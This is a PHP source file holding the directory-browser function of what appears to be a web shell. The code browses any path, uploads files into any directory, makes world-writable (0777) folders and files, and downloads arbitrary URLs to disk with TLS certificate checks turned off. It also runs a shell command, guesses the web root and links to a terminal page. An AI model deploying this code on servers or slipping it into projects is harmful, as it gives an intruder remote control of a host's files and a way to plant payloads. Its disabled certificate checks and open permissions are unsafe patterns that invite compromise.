<?php
	/*
		Function for displaying the directory view.
	*/

	//Shows rthe file browser
	function showShell(){
		set_time_limit(30);

		$config=getConfig();
		$views=array(
			'thumbs'=>'Thumbnails',
			'details'=>'Details'
		);

		$drives=array();
		$buffer='';
		$path=realpath(av($_GET,'path',__DIR__));
		$view=av($_GET,'view');
		if(!isset($views[$view])){
			$view='details';
		}

		if(!$path){
			exit(html('<h1 class="err">Invalid Path</h1>'));
		}
		$url=weburl($path);

		//Handle file upload
		if(av($_FILES,'file')){
			$file=av($_FILES,'file');
			//setHeader('Content-Type','text/plain');
			//var_dump($_FILES);
			//exit(0);
			for($i=0;$i<count($file['name']);$i++){
				if($file['error'][$i]===UPLOAD_ERR_OK){
					move_uploaded_file($file["tmp_name"][$i],$path . DIRECTORY_SEPARATOR . basename($file["name"][$i]));
				}
			}
		}

		//Create a directory
		if(av($_POST,'newdir')){
			$newdir=$path . DIRECTORY_SEPARATOR . av($_POST,'newdir');
			//The permission is 777 but it's octal.
			if(@mkdir($newdir,0b111111111,TRUE)){
				$path=realpath($newdir);
				exit(redir(selfurl() . '?action=shell&path=' . urlencode($path)));
			}
		}

		//Create a file
		if(av($_POST,'newfile')){
			$newfile=$path . DIRECTORY_SEPARATOR . av($_POST,'newfile');
			if(@touch($newfile)){
				exit(redir(selfurl() . '?action=open&path=' . urlencode($newfile)));
			}
		}

		//Get from server
		if(av($_POST,'url')){
			$url=filter_var(av($_POST,'url'),FILTER_VALIDATE_URL);
			if($url){
				$stream_context=stream_context_create(array('ssl'=>array(
					'verify_peer'      =>FALSE,
					'verify_peer_name' =>FALSE,
					'allow_self_signed'=>TRUE,
					'verify_depth'     =>0)));

				$name=basename($url);
				if(!$name || stripos($name,'/')!==FALSE){
					$name='file.bin';
				}
				$name=$path . DIRECTORY_SEPARATOR . $name;
				if(@copy($url,$name,$stream_context)){
					exit(redir(selfurl() . '?action=shell&path=' . urlencode($path)));
				}
			}
		}

		//On windows, try to find drives by enumerating the total size
		if(isWindows()){
			foreach(str_split('ABCDEFGHIJKLMNOPQRSTUVWXYZ') as $x){
				if(FALSE!==@disk_total_space("$x:")){
					$drives[]="$x:" . DIRECTORY_SEPARATOR;
				}
			}
		}
		else{
			$drives[]='/';
		}
		//Drive list
		$buffer.='<form method="get" action="' . selfurl() . '">
		<input type="hidden" name="action" value="shell" />
		<input type="hidden" name="view" value="'.he($view).'" />';
		foreach($drives as $x){
			//Get volume label
			$label=stripnl(av(run('vol ' . substr($x,0,2)),'stdout','Unknown volume label'));
			//Disk switch button
			$buffer.='<input type="submit" name="path" value="' . he($x) . '" title="' . he($label) . '" />';
			//Get and display size
			$total=disk_total_space($x);
			$free=disk_free_space($x);
			$perc=100-round($free/$total*100);
			$buffer.='<div class="progress" title="Used ' . he(formatSize($total-$free)) . ' of ' . he(formatSize($total)) . '"><div class="width-' . $perc . '">' . $perc . '%</div></div>' . PHP_EOL;
		}
		$buffer.='</form>';

		if($url){
			$buffer.='<div>Guessed URL: <a href="' . he($url) . '">' . he($url) . '</a></div>';
		}
		else{
			$buffer.='<div>Guessed URL: <i>Unable to guess, maybe outside of web root.</i><br />';
			$webroot=webroot();
			if($webroot){
				$buffer.='Web root detected as <a href="' . selfurl() . '?action=shell&amp;path=' . he(urlencode($webroot)) . '">' . he($webroot) . '</a>';
			}
			else{
				$buffer.='Web root detection failed.';
			}
			$buffer.='</div>';
		}

		$list=@scandir($path);
		sort($list,SORT_FLAG_CASE|SORT_NATURAL);
		if($list){
			//Terminal form
			$buffer.='<form method="get"><input type="hidden" name="action" value="shell" />' .
				'<input type="hidden" name="view" value="' . he($view) . '" />' .
				'<input type="text" name="path" value="' . he($path) . '" size="80" required />' .
				'<input type="submit" value="Go" />';
			$buffer.='<a href="' . selfurl() . '?action=terminal&amp;path=' . urlencode($path) . '" class="btn">Open terminal here</a>
				</form>';

			//View form
			$buffer.='<p>Switch view: ';
			foreach($views as $k=>$v){
				$buffer.='<a href="' . selfurl() . '?action=shell&amp;view=' . he(urlencode($k)) . '&amp;path=' . urlencode($path) . '" class="btn">' . he($v) . '</a>';
			}
			$buffer.='</p>';

			$buffer.='<p>Total entries: ' . (count($list)-2) . '</p>';

			switch($view){
				case 'thumbs':
					$buffer.=file_thumbs($path,$list);
					break;
				default:
					$buffer.=file_table($path,$list);
					break;
			}


			$buffer.='<h2>Creating/Adding</h2>';

			//Directory form
			$buffer.='<form method="post">
				<label>Create directory:&nbsp;<input type="text" size="40" name="newdir" placeholder="Directory name" required /></label>
				<input type="submit" value="Create" />
				<small>You can create multiple levels at once</small>
			</form>';

			//File form
			$buffer.='<form method="post">
				<label>Create file:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" placeholder="File name" size="40" name="newfile" required /></label>
				<input type="submit" value="Create" />
			</form>';

			//Remote file form
			if(asBool(ini_get('allow_url_fopen'))){
				$buffer.='<form method="post">
					<label>Get from Server:&nbsp;&nbsp;<input type="url" size="40" name="url" required placeholder="Enter http(s):// or ftp:// URL here" /></label>
					<input type="submit" value="Download" />
					<small>The file name is guessed from the URL. If not possible, <code>file.bin</code> is used.</small>
				</form>';
			}else{
				$buffer.='<p class="err"><code>allow_url_fopen</code> is disabled</p>';
			}

			//Upload form
			if(asBool(ini_get('file_uploads'))){
				$buffer.='<form method="post" enctype="multipart/form-data">
					<label>Upload Files:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="file" name="file[]" multiple required /></label>
					<input type="submit" value="Upload" />
					<small>You can hold down the CTRL key to select multiple files.</small><br />
					Max: ' . ini_get('max_file_uploads') . ' files, ' . ini_get('upload_max_filesize') .
					' per file, ' . ini_get('post_max_size') . ' total.
				</form>';
			}else{
				$buffer.='<p class="err">File uploads are disabled on this server</p>';
			}
		}
		else{
			exit(html(homeForm() . '<h1 class="err">Unable to scan this directory</h1><a href="#" class="backlink">&lt;&lt; Back</a>'));
		}

		exit(html(homeForm() . $buffer));
	}
